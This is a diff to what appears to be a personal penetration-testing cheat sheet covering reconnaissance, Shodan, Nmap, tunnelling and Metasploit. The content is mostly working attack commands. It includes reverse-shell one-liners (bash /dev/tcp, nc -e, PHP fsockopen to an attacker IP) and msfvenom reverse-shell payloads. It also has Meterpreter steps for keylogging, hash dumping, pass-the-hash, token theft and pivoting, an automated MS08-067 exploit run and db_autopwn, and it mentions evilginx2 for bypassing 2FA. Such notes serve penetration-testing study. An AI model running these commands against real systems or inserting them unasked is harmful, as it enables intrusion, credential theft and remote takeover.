@@ -1,4 +1,5 @@
-Commands
+# Commands
+#------------------------------------------------------------------------------
   dirb https://domain.com # bruto forse open wordlist 
   dmitry -s -e -w -p domain.com # scan,email,whois,tcp subdomain search
   fierce -dns $domain -threads 10 # trase domain
@@ -23,8 +24,7 @@ Commands
   shodan parse --fields ip_str, hacked-sites.json.gz
   shodan parse -f location.country_code:US a.json.gz -O ab.json.gz
   shodan parse ab.json.gz --fields ip_tr,port,hosnames,location.country
-  shodan parse --fields title hacked.json.gz | grep -r "hacked by" | 
-sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
+  shodan parse --fields title hacked.json.gz | grep -r "hacked by" | sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
   shodan radar
   shodan scan submit --filename scandata 192.20.20.0/24
   shodan stats --facets telnet.option --limit 20 port:23
@@ -39,11 +39,14 @@ sed -e 's/.*hacked by//i' | sort | uniq -c | sort -klnr -k2d | head -10
   shodan search --fields ip_str,port,title 'title:"hacked by"'
   shodan search port:23 telnet.option:com_port_option
   shodan search e7:86:c7:22:b3:08:af:c7:11:fb:a5:ff:9a:ae:38:e4
-  sslscan host.com:port # hunting for flags,misconfiguration
+  sslscan host.com:port           # hunting for flags,misconfiguration
+  sslyze --regular <domain>
+  openssl s_client -connect <domain:port>
   theharvester -d domain/name -l 20 -b all  # b -sources;list
   whatweb hostname.com
 
-Network Bandwitch
+# Network Bandwitch
+#------------------------------------------------------------------------------
   bmon  # similat to nload
   bwm-ng -o curses2 # -bar graphs
   cbm
@@ -64,7 +67,9 @@ Network Bandwitch
   top -d 1.0 -b | grep Cpu
   vnstat -l -i eth0   # runs in background service/daemon
 
-Network Connections
+# Network Connections
+#------------------------------------------------------------------------------
+  netstat -natup
   ss | less  # list all connections
   ss -tux  # ss -A tcp - filter tcp,udp or unix connections
   ss -a -A udp  # all, All tests
@@ -80,7 +85,8 @@ Network Connections
   ss -nt src 127.0.0.1 sport gt :5000
   watch -n 1 "ss -t4 state syn-sent"
 
-Nmap
+# Nmap
+#------------------------------------------------------------------------------
   --send-eth/send-ip  # send using raw ethernet frames or ip packets
   --script "http-*"   # Scripts with wildcard
   --source-port <number>
@@ -91,32 +97,15 @@ Nmap
   --data hex string  # append custom binary data to sent packets
   --initial-rtt-timeout 250ms --max-retries 2 --host-timeout 15m
 
-
-Metasploit Framework
-  msfconsole
-  search exploit_name
-  use exploits/path/to/exploit
-  show options
-  set RHOST <target.ip>
-  set payload windows/meterpreter/reverse_tcp
-  set lhost <our.machine>
-  set lport <our.port>
-  exploit
-
-Metasploit Payload
-  # https://www.offensive-security.com/metasploit-unleashed/msfpayload/
-  msfpayload -l
-  msfpayload windows/shell_bind_tcp 0
-  # changing exit technique listening port;output as C,Perl,Raw
-  msfpayload windows/shell_bind_tcp EXITFUNC=seh LPORT=1234 0 C
-
-Reverse Shells
+# Reverse Shells
+#------------------------------------------------------------------------------
   bash -i >& /dev/tcp/<attackerip>/<port> 0>&1
   nc -e /bin/sh <attackerip> <port>
   php -r '$sock=fsockopen("<attackip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
   rm /tmp/f;mkfifo /tmp/f;cat
 
-Routersploit
+# Routersploit
+#------------------------------------------------------------------------------
   git clone https://github.com/reverse-shell/routersploit
   cd routersploit  && ./rsf.py # it starts "rsf >"
   use exploits/dlink/dcs_930l_auth_rce
@@ -131,10 +120,6 @@ Routersploit
   set target 192.168.1.1
   run
 
-SSH Tunnelling
-  ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
-  ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
-
 
 # Penetration Testing Methodology
 #-------------------------------------------------------------------------------
@@ -143,11 +128,10 @@ vulnerability assessment versus penetration testing
 Open Source Security Testing Mewthodology Manual (OSSTMM)
 Open Web Application Security Project (OWASP)
 Web Application Security Consortium threat Classification (WASC-TC)
-Penetration Testing Execution Standard (PTES)  -> pre engagement, intelligence gathering , threat modeling
-	vulnerability analysis, exploitation, post-exploitation, reporting
-General Penetration Testing Framework
-	target Scopping, INformation gathering, Target discovery, Enumeration target, Vulnerability mapping
-	Social engineering, Target exploitation, Privilege excalation, Maintaining access, reporting
+Penetration Testing Execution Standard (PTES)  -> pre engagement, intelligence gathering , threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting
+General Penetration Testing Framework - 
+target scopping,info gathering,target discovery,Enumeration target, Vulnerability mapping
+Social engineering, Target exploitation, Privilege excalation, Maintaining access, reporting
 
 # Target Scoping
 #-------------------------------------------------------------------------------
@@ -340,7 +324,8 @@ nc -nvv 192.168.56.102 4444
 Intersect
 
 
-# Tunneling
+# Tunnelling
+#------------------------------------------------------------------------------
 dns2tcp   -> encapsulate TCP in DNS,only DNS request is allowed from target
 dns2tcp -F -d 1 -f /etc/dns2tcp.conf  #-F run in foreground, debug level to 1
 iodine
@@ -351,18 +336,16 @@ ncat 192.168.2.23 1337                 # from machine connect to target
 # Reverse shell
 ncat -l 1337                           # set pen machine to listen on port 1337
 ncat 192.168.2.21 1337 -e /bin/sh      # on target use the following ncat cmd 
-
+ssh -f -N -L <source>:<port>:<dest>:<port> user@relay # execute from source
+ssh -f -N -R <source>:<port>:<dest>:<port> user@relay # execute from dest
 
 proxychains -> any TCP connection made by any given TCP client to go through the proxy or proxy chain (SOCK4, SOCK5, HTTP CONNECT  --> proxy types)
 proxychain telnet example.com
 
 
-
-
 #------------------------------------------------------------------------------
 # MSFconsole
 #------------------------------------------------------------------------------
-
 # Init 
 #------------------------------------------------------------------------------
 /etc/init.d/postresql start
@@ -402,9 +385,9 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.10.5 LPORT=443 -f ex
    # http://hackingandsecurity.blogspot.com/2018/10/metasploitable-3-without-metasploit.html
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.253.130 LPORT=8443 -f war > shell.war     # unzip shell.war
 proxychains nmap -P0 -sT -p 3389 --open -oN tcp.nmap 192.168.1.155
-proxychains rdesktop 192.168.1.155
+proxychains rdesktop 192.168.1.155         # remove connection
 ssh -l benr -D 1080 192.168.253.143 -N -f
-sslscan <domain>                      # ssl
+sslscan <domain>                           # SSL review
 whois secmaniac.net
 
 # MSFconsole
@@ -428,9 +411,9 @@ show targets
 search <apache>
 sessions -l -v
 session -i 1
-session -u 1        # upgrade a cmd shell to a Meterpreter shell
-session -u 2        # Meterpreter shell 
-session -z          # will not interact with sesion once target has been exploited
+session -u 1    # upgrade a cmd shell to a Meterpreter shell
+session -u 2    # Meterpreter shell 
+session -z      # will not interact with session once target has been exploited
 use 
 workspace -a my-lab1
 workspace my-lab1                              # choose workspace
@@ -451,26 +434,26 @@ screenshot
 sysinfo
 
 # Capturing Keystroke
-   > ps
+meterpreter> ps
    > migrate <process_number_of_explorer.exe>
    > run post/windows/capture/keylog_recorder   # save into the file 
 cat file_with_keylog_recorder.txt
 
 # Dumping Usernames and Passwords
-   # win: Administrator:500:<LM_hash>:<NTLM_hash>:::  -> we extract user & pass hash
-   # rainbow table attack
-   > use priv
+#    win: Administrator:500:<LM_hash>:<NTLM_hash>:::-> extract user & pass hash
+#    Rainbow Table Attack
+meterpreter> use priv
    > run post/windows/gather/smart_hashdump
 
-# Pass the Hash   - we have only hash we don't have password
-   > use  auxiliary/admin/smb/psexec_command
+# Pass the Hash > we have only hash we don't have password
+meterpreter> use  auxiliary/admin/smb/psexec_command
    > set SMBPass <LM_hash>:<NTLM_hash>
    > exploit
 
 # Privilege escalation
 
 # Token Impersonation
-   > ps             # number: 380  user:  SNEAK.in\domainadmin
+meterpreter> ps             # number: 380  user:  SNEAK.in\domainadmin
    > steal_token 380
    > list_tokens -u
    > intersonate_token SNEAK.in\domainadmin
@@ -479,7 +462,7 @@ cat file_with_keylog_recorder.txt
    > add_group
 
 # Pivoting onto Other Systems
-   > run get_local_subnets
+meterpreter > run get_local_subnets
    > background
    > route add 192.168.1.120 255.255.255.0 1 
    > route print
@@ -487,7 +470,7 @@ cat file_with_keylog_recorder.txt
    > load auto_add_route
 
 # Using Meterpreter Scripts
-   > run <script_name>
+meterpreter> run <script_name>
    > run vnc
    > run screen_unlock
    > run post/windows/manage/migrate              # migrating a Process
@@ -499,7 +482,7 @@ cat file_with_keylog_recorder.txt
            # -X > at boot time; -i > wait 50 seconds after start
 
 
-# Run exploit    - Resource files - autommate cmd inside msfconsole
+# Run exploit    - Resource files - Autommate CMDs inside msfconsole
 #------------------------------------------------------------------------------
 echo use exploit/windows/smb/ms08_067_netapi  > rf.rc
 echo load sourds >> rf.rc
@@ -507,13 +490,10 @@ echo set RHOST [IP] >> rf.rc
 echo set PAYLOAD windows/meterpreter/reverse_tcp   >> rf.rc 
 echo set LHOST [IP] >> rf.rc
 echo run >> rf.rc 
+# 1.
 ./msfconsole -r rf.rc
-or
+# or 2.
 msf > resource name_of_resource_script.rc
-
-# call resource file from msfconsole - >
-    > resource basic_discovery.rc
-
 
 # Inporting nmap result into Metasploit
 #------------------------------------------------------------------------------
@@ -588,12 +568,11 @@ wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autop
 cd metasploit-autopwn
 cp db_autopwn.rb /usr/share/metasploit-framework/plugins
 # metasploit's autopwn tool automaticly targets and exploits
-    > load db_autopwn
-    > db_autopwn -p -R great -e -q 192.168.1.155
-    > db_autopwn -e -t -r -x -p
+msf> load db_autopwn
+   > db_autopwn -p -R great -e -q 192.168.1.155
+   > db_autopwn -e -t -r -x -p
        # e > all targets; t > all matching modules; r > reverse shell payload
        # x > select exploit module based on vulnerability p > open ports
-
 
 # MS08-067 - Remove Procedure Call [RPC] service
 msf > search ms08_067
@@ -690,10 +669,20 @@ print_error("error")
 cmd_exec(cmd)
 eventlog_clear(evt = "" )
 
-# TOmcat 
+# Tomcat
 use multi/http/tomcat_mgr_deploy
 
+#------------------------------------------------------------------------------
+# WEB Penetration
+#------------------------------------------------------------------------------
+wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add
+sudo apt-get update
+sudo apt-get upgrade
 
+nmap -p 80,443 --script=http-waf-detect <ip>
+
+
+#------------------------------------------------------------------------------
 # Two Factor Authentication
 #------------------------------------------------------------------------------
 # evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.
